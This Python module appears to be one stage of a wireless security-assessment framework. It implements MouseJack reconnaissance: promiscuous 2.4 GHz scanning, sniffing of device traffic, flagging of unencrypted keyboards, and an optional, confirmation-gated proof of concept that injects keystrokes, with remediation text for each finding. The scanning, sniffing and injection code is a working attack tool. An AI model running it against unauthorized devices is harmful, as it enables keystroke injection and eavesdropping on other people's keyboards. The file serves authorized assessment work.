"""
Stage 24 — MouseJack 2.4 GHz HID Reconnaissance

Implements the Bastille Research MouseJack vulnerability assessment (2016)
against Logitech Unifying, Microsoft, and other non-Bluetooth 2.4 GHz
wireless keyboards and mice that use the nRF24L01+ radio chip.

Attack surface:
  Vendor implementations that omit encryption on HID data channels allow
  an attacker to inject arbitrary HID keyboard reports (keystrokes) at the
  MAC-layer without any pairing or authentication.

Stage flow:
  1. Promiscuous scan (Goodspeed trick) — channels 0–99 at 250K/1M/2M.
     Captures raw packets; extracts candidate 5-byte device addresses by
     correlation (address bytes appear consistently in captures from the
     same device on the same channel).
  2. Targeted sniff — for each candidate address, enter sniffer mode and
     confirm device traffic. Classify: mouse (short payloads, no keyboard
     HID report structure) vs keyboard (8-byte HID reports).
  3. Vulnerability assessment — any device sending plaintext HID keyboard
     reports is flagged CRITICAL (injectable without encryption).
  4. HID injection PoC (active-gated) — inject a benign "Hello" keystroke
     sequence to confirm exploitability.

Hardware requirement:
  nRF24L01+ USB dongle flashed with Bastille nRF Research Firmware:
  https://github.com/BastilleResearch/nrf-research-firmware
  (Typically a CrazyRadio PA. NOT the ButteRFly/WHAD dongle.)

References:
  Bastille Research — MouseJack (2016), CVE-2016-10761 et al.
  Travis Goodspeed — nRF24L01+ promiscuous sniffer trick (2011)
"""

from __future__ import annotations

import time
from collections import defaultdict

from core.nrf24 import MouseJackDongle, RATE_250K, RATE_1M, RATE_2M, RATE_LABELS
from core.models import Finding
from core.db import insert_finding
from core.logger import get_logger, active_gate
from core.vulndb import match_esb, VulnMatch
import config

log = get_logger("s24_mousejack")

# Minimum number of captures from the same address to treat it as real.
# Noise produces random byte patterns; a real device produces consistent
# 5-byte address prefixes repeatedly.
_MIN_ADDRESS_HITS = 3

# Minimum address bytes to extract from a raw promiscuous payload.
# In ESB the address is the first ADDRESS_WIDTH bytes after sync.
_ESB_ADDR_LEN = 5

# USB HID modifier + reserved + up to 6 keycodes (8 bytes total)
# A raw keyboard HID report is exactly 8 bytes.
_HID_REPORT_LEN = 8

# Known-injectable vendor prefixes from the Bastille research.
# First 3 bytes (OUI-style) of the 5-byte ESB address.
_LOGITECH_PREFIXES: frozenset[bytes] = frozenset({
    bytes.fromhex("bfb9b0"),
    bytes.fromhex("c9a6ba"),
    bytes.fromhex("e54a94"),
    bytes.fromhex("da23be"),
})


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def run(dongle: MouseJackDongle, engagement_id: str) -> None:
    """MouseJack reconnaissance and optional HID injection PoC.

    Args:
        dongle: Open MouseJackDongle instance.
        engagement_id: Engagement ID for Finding storage.
    """
    channels = list(config.MOUSEJACK_CHANNELS)
    scan_secs = config.MOUSEJACK_SCAN_SECS
    dwell_ms  = config.MOUSEJACK_DWELL_MS
    rates     = config.MOUSEJACK_RATES

    log.info(
        f"[S24] MouseJack promiscuous scan: "
        f"{len(channels)} channels × {len(rates)} data rates × "
        f"{dwell_ms}ms dwell ≈ {len(channels) * len(rates) * dwell_ms / 1000:.0f}s per pass "
        f"(total budget: {scan_secs}s)"
    )
    log.info("[S24] Rates: " + ", ".join(RATE_LABELS[r] for r in rates))

    # Phase 1: promiscuous scan — collect address candidates
    found: dict[bytes, dict] = _promiscuous_scan(
        dongle, channels, rates, dwell_ms, scan_secs
    )
    if not found:
        log.info("[S24] No 2.4 GHz HID devices detected during promiscuous scan.")
        _print_summary(found, [])
        return

    log.info(f"[S24] {len(found)} candidate device address(es) found.")

    # Phase 2: targeted sniff — characterise each device
    sniff_secs = config.MOUSEJACK_SNIFF_SECS
    vulnerable: list[dict] = []
    for addr, info in found.items():
        _sniff_device(dongle, addr, info, channels, sniff_secs)
        if info.get("vulnerable"):
            vulnerable.append(info)

    # Phase 3: findings
    for info in found.values():
        _emit_finding(info, engagement_id)

    _print_summary(found, vulnerable)

    if not vulnerable:
        log.info("[S24] No injectable devices found.")
        return

    # Phase 4: HID injection PoC (active-gated)
    log.info(
        f"[S24] {len(vulnerable)} device(s) appear injectable. "
        "MouseJack allows unauthenticated HID keystroke injection."
    )
    if not active_gate(
        24,
        "Inject HID keystrokes into vulnerable wireless keyboard(s)?",
    ):
        log.info("[S24] Injection skipped (active-gate declined).")
        return

    for info in vulnerable:
        _inject_hid(dongle, info)


# ---------------------------------------------------------------------------
# Phase 1 — promiscuous scan
# ---------------------------------------------------------------------------

def _promiscuous_scan(
    dongle: MouseJackDongle,
    channels: list[int],
    rates: list[int],
    dwell_ms: int,
    budget_secs: float,
) -> dict[bytes, dict]:
    """Scan all channels at all data rates; return address→info map."""
    # addr_bytes → {rate: int, channel: int, hits: int, payloads: list[bytes]}
    candidates: dict[bytes, dict] = defaultdict(lambda: {
        "hits": 0, "rate": 0, "channel": 0, "payloads": [],
    })

    deadline = time.monotonic() + budget_secs
    for rate in rates:
        if time.monotonic() >= deadline:
            break
        rate_label = RATE_LABELS[rate]
        log.info(f"[S24] Promiscuous scan @ {rate_label} ...")
        remaining = deadline - time.monotonic()
        for ch, payload in dongle.scan_promiscuous(channels, rate, dwell_ms):
            if time.monotonic() >= deadline:
                break
            addr = _extract_address(payload)
            if addr is None:
                continue
            c = candidates[addr]
            c["hits"] += 1
            if not c["payloads"]:
                c["rate"]    = rate
                c["channel"] = ch
            c["payloads"].append(payload)

    # Filter out noise — keep only addresses seen at least _MIN_ADDRESS_HITS times
    confirmed: dict[bytes, dict] = {}
    for addr, info in candidates.items():
        if info["hits"] >= _MIN_ADDRESS_HITS:
            info["addr_hex"]   = addr.hex()
            info["addr_bytes"] = addr
            info["device_type"] = _classify_vendor(addr)
            info["vulnerable"]  = False
            info["plaintext_hid"] = False
            confirmed[addr] = info
            log.info(
                f"[S24] Device {addr.hex(':')} — "
                f"{info['hits']} hits @ ch{info['channel']} {RATE_LABELS[info['rate']]} "
                f"({info['device_type']})"
            )
    return confirmed


def _extract_address(payload: bytes) -> bytes | None:
    """Extract the 5-byte ESB device address from a promiscuous payload.

    In a promiscuous capture the first _ESB_ADDR_LEN bytes of the payload
    correspond to the device's ESB address after the radio strips the
    preamble. Returns None for payloads too short to contain an address.
    """
    if len(payload) < _ESB_ADDR_LEN:
        return None
    return payload[:_ESB_ADDR_LEN]


def _classify_vendor(addr: bytes) -> str:
    """Return a vendor hint based on the address prefix."""
    prefix3 = addr[:3]
    if prefix3 in _LOGITECH_PREFIXES:
        return "Logitech Unifying (likely injectable)"
    # Microsoft uses a different channel set (25-50) and 5-byte addresses
    # starting with specific patterns documented in Bastille research.
    if addr[0] in (0xCD, 0xCE, 0xCF, 0xD0, 0xD1):
        return "Microsoft wireless (check for plaintext HID)"
    return "Unknown vendor 2.4 GHz HID"


# ---------------------------------------------------------------------------
# Phase 2 — targeted sniff
# ---------------------------------------------------------------------------

def _sniff_device(
    dongle: MouseJackDongle,
    addr: bytes,
    info: dict,
    channels: list[int],
    duration_s: float,
) -> None:
    """Sniff targeted traffic from addr; update info in-place."""
    log.info(
        f"[S24] Targeted sniff: {addr.hex(':')} @ {RATE_LABELS[info['rate']]} "
        f"for {duration_s}s ..."
    )
    keyboard_reports = 0
    mouse_reports    = 0

    for _ch, payload in dongle.sniff_address(
        addr, channels, info["rate"], duration_s
    ):
        # USB HID keyboard report: 8 bytes (modifier, reserved, 6×keycode)
        if len(payload) == _HID_REPORT_LEN and payload[1] == 0x00:
            keyboard_reports += 1
            if payload[2] != 0x00:  # non-zero keycode = active key
                log.debug(
                    f"[S24] {addr.hex(':')} HID key: "
                    f"mod={payload[0]:#04x} keys={payload[2:][:6].hex()}"
                )
        elif len(payload) in (3, 4, 5, 7):
            # Mouse typically has 3-7 byte reports: buttons + delta X/Y + wheel
            mouse_reports += 1

    info["keyboard_reports"] = keyboard_reports
    info["mouse_reports"]    = mouse_reports

    if keyboard_reports > 0:
        info["device_class"]  = "keyboard"
        info["vulnerable"]    = True
        info["plaintext_hid"] = True
        log.info(
            f"[S24] VULNERABLE: {addr.hex(':')} — "
            f"{keyboard_reports} plaintext keyboard HID report(s) captured. "
            "Keystroke injection possible without authentication."
        )
        # CVE matching for unencrypted HID keyboard devices
        vendor_type = info.get("device_type", "")
        is_keyboard = True
        cve_matches = match_esb(vendor=vendor_type, encrypted=False, hid_keyboard=is_keyboard)
        info["cve_matches"] = cve_matches
        for vm in cve_matches:
            log.info(
                f"[S24] CVE match: {vm.cve or vm.name} [{vm.severity}] — {vm.summary}"
            )
    elif mouse_reports > 0:
        info["device_class"] = "mouse"
        # Mouse injection is possible (move/click) but less impactful
        info["vulnerable"]   = False
        log.info(
            f"[S24] Mouse device: {addr.hex(':')} — "
            f"{mouse_reports} mouse HID report(s). "
            "Mouse injection possible but keyboard injection not confirmed."
        )
    else:
        info["device_class"] = "unknown"
        log.info(f"[S24] {addr.hex(':')} — no identifiable HID reports in sniff window.")


# ---------------------------------------------------------------------------
# Phase 4 — HID injection PoC
# ---------------------------------------------------------------------------

def _inject_hid(dongle: MouseJackDongle, info: dict) -> None:
    """Inject a benign HID keystroke sequence into a vulnerable device."""
    addr   = info["addr_bytes"]
    rate   = info["rate"]
    ch     = info["channel"]

    log.info(f"[S24] Injecting HID keystroke PoC into {addr.hex(':')}")
    dongle.enter_sniffer_mode(addr)
    dongle.set_channel(ch)

    # Parse hex payload from config (space-separated 2-byte groups)
    try:
        hid_raw = bytes.fromhex(
            config.MOUSEJACK_HID_PAYLOAD.replace(" ", "")
        )
    except ValueError:
        log.warning("[S24] MOUSEJACK_HID_PAYLOAD is invalid hex — using empty keystroke.")
        hid_raw = bytes(8)

    # Pad/trim to exactly 8 bytes (standard HID boot keyboard report)
    hid_payload = (hid_raw + bytes(8))[:8]

    success = dongle.transmit_payload(hid_payload, timeout_ms=2500, retransmits=3)
    if success:
        log.info(
            f"[S24] Injection transmitted: payload={hid_payload.hex()} "
            f"target={addr.hex(':')}"
        )
        # Release (all-zeros) keystroke
        time.sleep(0.05)
        dongle.transmit_payload(bytes(8), timeout_ms=2500, retransmits=1)
    else:
        log.warning(f"[S24] Injection failed for {addr.hex(':')}")


# ---------------------------------------------------------------------------
# Findings
# ---------------------------------------------------------------------------

def _emit_finding(info: dict, engagement_id: str) -> None:
    addr_str = info["addr_hex"]
    if info.get("plaintext_hid"):
        severity = "critical"
        title    = "MouseJack: Plaintext HID Keyboard — Keystroke Injection"
        desc = (
            f"Wireless keyboard at address {addr_str} ({info.get('device_type', 'unknown')}) "
            f"transmits plaintext HID keyboard reports with no link-layer encryption. "
            f"{info.get('keyboard_reports', 0)} unencrypted HID report(s) captured. "
            "An attacker within 100 m can inject arbitrary keystrokes using a "
            "commodity nRF24L01+ dongle and the Bastille nrf-research-firmware."
        )
        remediation = (
            "Replace the affected wireless keyboard with a Bluetooth device using "
            "AES-CCM encryption, or a wired USB keyboard. If the device is Logitech "
            "Unifying, apply the Logitech Security Bulletin LSB001 firmware update. "
            "Prefer devices that implement ESB encryption (Logitech BOLT) or Bluetooth LE."
        )
    elif info.get("device_class") == "mouse":
        severity = "medium"
        title    = "MouseJack: Wireless Mouse — Mouse Injection Possible"
        desc = (
            f"Wireless mouse at address {addr_str} ({info.get('device_type', 'unknown')}) "
            f"transmits without encryption. "
            f"{info.get('mouse_reports', 0)} mouse HID report(s) observed. "
            "Mouse injection (cursor movement, clicks) is possible. "
            "Without a paired keyboard, arbitrary command execution via mouse alone is "
            "limited but drive-by attacks on UI elements are feasible."
        )
        remediation = (
            "Replace with a Bluetooth mouse using AES encryption or a wired USB mouse."
        )
    else:
        severity = "info"
        title    = "MouseJack: 2.4 GHz HID Device Detected"
        desc = (
            f"2.4 GHz HID device detected at address {addr_str} "
            f"({info.get('device_type', 'unknown')}). "
            "Encryption status could not be confirmed in the sniff window."
        )
        remediation = "Investigate device and confirm whether encryption is in use."

    finding = Finding(
        type="mousejack_hid_device",
        severity=severity,
        target_addr=addr_str,
        description=desc,
        remediation=remediation,
        evidence={
            "address": addr_str,
            "device_type": info.get("device_type", "unknown"),
            "device_class": info.get("device_class", "unknown"),
            "data_rate": RATE_LABELS.get(info.get("rate", 2), "unknown"),
            "channel": info.get("channel", 0),
            "hits": info.get("hits", 0),
            "keyboard_reports": info.get("keyboard_reports", 0),
            "mouse_reports": info.get("mouse_reports", 0),
            "plaintext_hid": info.get("plaintext_hid", False),
        },
        engagement_id=engagement_id,
    )
    insert_finding(finding)
    log.info(f"FINDING [{severity}] mousejack_hid_device: {addr_str} ({title})")

    # Insert CVE-matched findings from vulndb
    for vm in info.get("cve_matches", []):
        cve_finding = Finding(
            type="cve_match",
            severity=vm.severity,
            target_addr=addr_str,
            description=f"{vm.cve + ': ' if vm.cve else ''}{vm.name} — {vm.summary}",
            remediation=vm.remediation,
            evidence={
                "cve": vm.cve,
                "vuln_name": vm.name,
                "tags": list(vm.tags),
                "references": list(vm.references),
                "source_device_type": info.get("device_type", "unknown"),
                "source_device_class": info.get("device_class", "unknown"),
            },
            engagement_id=engagement_id,
        )
        insert_finding(cve_finding)
        log.info(
            f"FINDING [{vm.severity}] cve_match: "
            f"{vm.cve or vm.name} for {addr_str}"
        )


# ---------------------------------------------------------------------------
# Summary
# ---------------------------------------------------------------------------

def _print_summary(found: dict, vulnerable: list) -> None:
    log.info("\n" + "─" * 76)
    log.info("  STAGE 24 SUMMARY -- MouseJack 2.4 GHz HID Reconnaissance")
    log.info("─" * 76)
    log.info(f"  {'Devices found':<28}: {len(found)}")
    log.info(f"  {'Injectable (plaintext HID)':<28}: {len(vulnerable)}")
    for info in found.values():
        vuln_str = "INJECTABLE" if info.get("plaintext_hid") else (
            "mouse-inject" if info.get("device_class") == "mouse" else "unknown"
        )
        log.info(
            f"    {info['addr_hex']}  {info.get('device_type','?'):<40}  "
            f"ch={info.get('channel',0):<3}  {RATE_LABELS.get(info.get('rate',2),'?'):<8}  "
            f"{vuln_str}"
        )
    if not found:
        log.info("  Result: no 2.4 GHz HID devices detected.")
    log.info("─" * 76 + "\n")
